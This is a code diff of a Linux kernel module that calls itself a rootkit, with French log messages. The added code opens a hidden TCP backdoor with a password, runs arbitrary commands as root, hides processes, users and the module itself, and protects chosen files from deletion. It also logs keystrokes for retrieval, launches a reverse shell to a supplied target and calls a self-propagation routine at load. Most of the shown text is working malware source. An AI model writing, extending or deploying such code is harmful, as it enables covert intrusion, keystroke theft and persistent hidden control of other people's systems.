+static int backdoor_thread_fn(void *data)
+{
+    int ret = 0;
+    while (!kthread_should_stop()) {
+        ret = handle_backdoor_connection();
+        if (ret == -EAGAIN || ret < 0)
+            msleep(100);
+    }
+    return 0;
+}
+
+/**
+ * The function `close_backdoor_port` closes a backdoor port if it is open.
+ */
+static void close_backdoor_port(void)
+{
+    if (backdoor_thread) {
+        kthread_stop(backdoor_thread);
+        backdoor_thread = NULL;
+    }
+
+    if (backdoor_sock) {
+        sock_release(backdoor_sock);
+        backdoor_sock = NULL;
+        backdoor_port = 0;
+        pr_info("[+] Backdoor fermée\n");
+    }
+}
+
+/**
+ * The function `open_backdoor_port` creates a TCP socket, binds it to a specified port, and listens
+ * for incoming connections.
+ * 
+ * @param port The `port` parameter in the `open_backdoor_port` function is an integer that specifies
+ * the port number on which the backdoor will be opened for communication.
+ * 
+ * @return The function `open_backdoor_port` returns an integer value. If the function is successful in
+ * opening the backdoor port, it returns 0. If there is an error during the process, it returns a
+ * negative value indicating the error code.
+ */
+static int open_backdoor_port(int port)
+{
+    struct sockaddr_in addr;
+    int ret;
+
+    close_backdoor_port();
+    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &backdoor_sock);
+    if (ret < 0)
+        return ret;
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
+    if (ret < 0)
+        goto out;
+
+    ret = kernel_listen(backdoor_sock, 1);
+    if (ret < 0)
+        goto out;
+
+    backdoor_thread = kthread_run(backdoor_thread_fn, NULL, "backdoor_thread");
+    if (IS_ERR(backdoor_thread)) {
+        backdoor_thread = NULL;
+        printk(KERN_ERR "rootkit: failed to create backdoor thread\n");
+    }
+
+    backdoor_port = port;
+    pr_info("[+] Backdoor ouverte sur le port %d\n", port);
+    return 0;
+
+    out:
+        sock_release(backdoor_sock);
+        backdoor_sock = NULL;
+    return ret;
+}
+
+
+/**
+ * The function `handle_escalation` in the given code snippet handles privilege escalation
+ * by executing a command as root.
+ * 
+ * @param args The `handle_escalation` function takes a pointer to a `struct rk_args` named `args` as a
+ * parameter. This structure likely contains information needed for privilege escalation, such as the
+ * method of escalation (`value`), the target process ID or command, etc.
+ * 
+ * @return The function `handle_escalation` returns an integer value. In the different scenarios within
+ * the function, it returns different error codes or success codes based on the outcome of the
+ * operations.
+ */
+static int handle_escalation(struct rk_args *args)
+{
+    if (args->value ==  RK_PRIVESC_BY_CMD) {
+        char cmd[256];
+        char __user *cmd_user = (char __user *)args->target;
+
+        memset(cmd, 0, sizeof(cmd));
+        if (copy_from_user(cmd, cmd_user, sizeof(cmd) - 1)) {
+            printk(KERN_ERR "rootkit: copy_from_user failed\n");
+            return -EFAULT;
+        }
+        cmd[sizeof(cmd) - 1] = '\0';
+        char *argv[] = {"/bin/sh", "-c", cmd, NULL};
+        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        
+        if (ret < 0) {
+            printk(KERN_ERR "rootkit: call_usermodehelper failed with command '%s'\n", cmd);
+            return ret;
+        }
+        printk(KERN_INFO "rootkit: escalade de privilèges réussie avec la commande '%s'\n", cmd);
+        return ret;
+    } else {
+        printk(KERN_ERR "rootkit: invalid escalation method %u\n", args->value);
+        return -EINVAL;
+    }
+    return 0;
 }
 
 /**
@@ -706,42 +1495,38 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
     struct rk_args args;
 
-    if (_IOC_TYPE(cmd) != RK_MAGIC)
+    if (_IOC_TYPE(cmd) != RK_MAGIC) {
         return -ENOTTY;
+    }
 
-    switch (cmd)
-    {
-
-    case RK_CMD_HELLO:
-        printk(KERN_INFO "rootkit: HELLO recu\n");
-        break;
-
+    if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args))) {
+        return -EFAULT;
+    }
+    mutex_lock(&rk_mutex);
+    
+    switch (cmd) {
     case RK_CMD_PRIVESC:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
-        /* TODO: commit_creds(prepare_kernel_cred(NULL)) */
+        handle_escalation(&args);
         break;
 
     case RK_CMD_HIDE_PID:
+        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
+        return add_hidden_pid((pid_t)args.target);
+
+    case RK_CMD_UNHIDE_PID:
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
-        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
-        pid_to_hide = (pid_t)args.target;
-        break;
+        printk(KERN_INFO "rootkit: UNHIDE_PID pour PID=%lu\n", args.target);
+        return remove_hidden_pid((pid_t)args.target);
 
     case RK_CMD_GETUID:
         args.target = (unsigned int)current_uid().val;
         args.value = 0;
-        if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
         break;
 
     case RK_CMD_SET_MSG:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
         if (strncpy_from_user(rk_msg,
                               (const char __user *)(unsigned long)args.target,
                               RK_MSG_MAX - 1) < 0)
@@ -749,11 +1534,142 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
         rk_msg[RK_MSG_MAX - 1] = '\0';
         break;
+        
+    case RK_CMD_OPEN_BACKDOOR:
+        if (open_backdoor_port((int)args.target) < 0)
+            return -EFAULT;
+        break;
 
-    default:
-        return -ENOTTY;
+    case RK_CMD_SET_BACKDOOR_PASS:
+        if (strncpy_from_user(backdoor_password,
+                            (const char __user *)(unsigned long)args.target,
+                            BACKDOOR_PASS_MAX - 1) < 0)
+            return -EFAULT;
+
+        backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
+        break;
+
+    case RK_CMD_HIDE_MODULE:
+        hide_module();
+        break;
+
+    case RK_CMD_SHOW_MODULE:
+        show_module();
+        break;
+
+    case RK_CMD_TOGGLE_KEYLOG:
+        keylog_enabled = !keylog_enabled;
+        printk(KERN_INFO "rootkit: keylogger %s\n",
+               keylog_enabled ? "enabled" : "disabled");
+        break;
+
+    case RK_CMD_GET_KEYLOG: {
+        unsigned long flags;
+        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
+            return -EFAULT;
+
+        spin_lock_irqsave(&keylog_lock, flags);
+        if (keylog_pos > 0) {
+            size_t to_copy = keylog_pos;
+            if (to_copy > RK_MSG_MAX - 1)
+                to_copy = RK_MSG_MAX - 1;
+            if (copy_to_user((char __user *)args.target,
+                             keylog_buf, to_copy)) {
+                spin_unlock_irqrestore(&keylog_lock, flags);
+                return -EFAULT;
+            }
+            /* flush buffer after read */
+            keylog_pos = 0;
+            keylog_buf[0] = '\0';
+        }
+        spin_unlock_irqrestore(&keylog_lock, flags);
+        break;
     }
 
+    case RK_CMD_HIDE_USER:
+        if (args.target == 0) {
+            hidden_user[0] = '\0';
+            printk(KERN_INFO "rootkit: user unhidden\n");
+        } else {
+            if (strncpy_from_user(hidden_user,
+                                  (const char __user *)args.target,
+                                  HIDDEN_USER_MAX - 1) < 0)
+                return -EFAULT;
+            hidden_user[HIDDEN_USER_MAX - 1] = '\0';
+            printk(KERN_INFO "rootkit: hiding user '%s'\n", hidden_user);
+        }
+        break;
+
+    case RK_CMD_PROTECT_FILE: {
+        char path[PROTECTED_PATH_MAX] = {0};
+        unsigned long flags;
+        if (strncpy_from_user(path, (const char __user *)args.target,
+                              PROTECTED_PATH_MAX - 1) < 0)
+            return -EFAULT;
+
+        spin_lock_irqsave(&protect_lock, flags);
+        if (protected_file_count >= MAX_PROTECTED_FILES) {
+            spin_unlock_irqrestore(&protect_lock, flags);
+            return -ENOSPC;
+        }
+        strscpy(protected_files[protected_file_count], path,
+                PROTECTED_PATH_MAX);
+        protected_file_count++;
+        spin_unlock_irqrestore(&protect_lock, flags);
+        printk(KERN_INFO "rootkit: protecting file '%s'\n", path);
+        break;
+    }
+
+    case RK_CMD_UNPROTECT_FILE: {
+        char path[PROTECTED_PATH_MAX] = {0};
+        unsigned long flags;
+        int i;
+        if (strncpy_from_user(path, (const char __user *)args.target,
+                              PROTECTED_PATH_MAX - 1) < 0)
+            return -EFAULT;
+
+        spin_lock_irqsave(&protect_lock, flags);
+        for (i = 0; i < protected_file_count; i++) {
+            if (strcmp(protected_files[i], path) == 0) {
+                strscpy(protected_files[i],
+                        protected_files[--protected_file_count],
+                        PROTECTED_PATH_MAX);
+                spin_unlock_irqrestore(&protect_lock, flags);
+                printk(KERN_INFO "rootkit: unprotected file '%s'\n", path);
+                return 0;
+            }
+        }
+        spin_unlock_irqrestore(&protect_lock, flags);
+        return -ENOENT;
+    }
+
+    case RK_CMD_REVERSE_SHELL: {
+        char *target_str;
+        struct task_struct *ts = NULL;
+        target_str = kzalloc(RK_REVSHELL_MAX, GFP_KERNEL);
+        if (!target_str)
+            return -ENOMEM;
+
+        if (strncpy_from_user(target_str, (const char __user *)args.target,
+                              RK_REVSHELL_MAX - 1) < 0) {
+            kfree(target_str);
+            return -EFAULT;
+        }
+        printk(KERN_INFO "rootkit: launching reverse shell to %s\n", target_str);
+        ts = kthread_run(reverse_shell_fn, target_str, "rk_revshell");
+        
+        if (IS_ERR(ts)) {
+            printk(KERN_ERR "rootkit: failed to create reverse shell thread\n");
+            kfree(target_str);
+        }
+        break;
+    }
+
+    default:
+        mutex_unlock(&rk_mutex);
+        return -ENOTTY;
+    }
+    mutex_unlock(&rk_mutex);
     return 0;
 }
 
@@ -838,24 +1754,30 @@ static int __init rootkit_init(void)
     int ret;
 
     ret = misc_register(&rk_misc);
-    if (ret)
-    {
+    if (ret) {
         printk(KERN_ERR "rootkit: misc_register failed (%d)\n", ret);
         return ret;
     }
 
     ret = install_hook();
-
     self_propagate();
 
     
-    if (ret)
-    {
+    if (ret) {
+        printk(KERN_ERR "[-] Erreur installation hooks\n");
         misc_deregister(&rk_misc);
-        return ret;
+        return -ENOENT;
     }
+
+    ret = input_register_handler(&keylog_handler);
+    if (ret)
+        pr_warn("rootkit: keylogger handler registration failed (%d)\n", ret);
+
+    /* Auto-hide module on load */
+    hide_module();
+
     printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
-           rk_misc.minor);
+        rk_misc.minor);
     return 0;
 }
 
@@ -865,30 +1787,35 @@ static int __init rootkit_init(void)
  */
 static void __exit rootkit_exit(void)
 {
-    if (getdents_hook.ops.func != NULL)
-    {
+    /* Restore module visibility so rmmod works cleanly */
+    show_module();
+
+    input_unregister_handler(&keylog_handler);
+
+    misc_deregister(&rk_misc);
+    if (getdents_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&getdents_hook.ops);
-        if (ret)
-        {
+        if (ret) {
             printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         }
     }
 
-    if (getdents_hook.address != 0)
-    {
+    if (getdents_hook.address != 0) {
         int ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
-        if (ret)
-        {
+        
+        if (ret) {
             printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
         }
     }
 
     uninstall_read_hook();
+    uninstall_tcp_hook();
+    uninstall_unlink_hook();
+    uninstall_rename_hook();
+    uninstall_udp_hook();
 
     synchronize_rcu();
-
-    misc_deregister(&rk_misc);
-
+    close_backdoor_port();
     printk(KERN_INFO "rootkit: unloaded\n");
 }
 
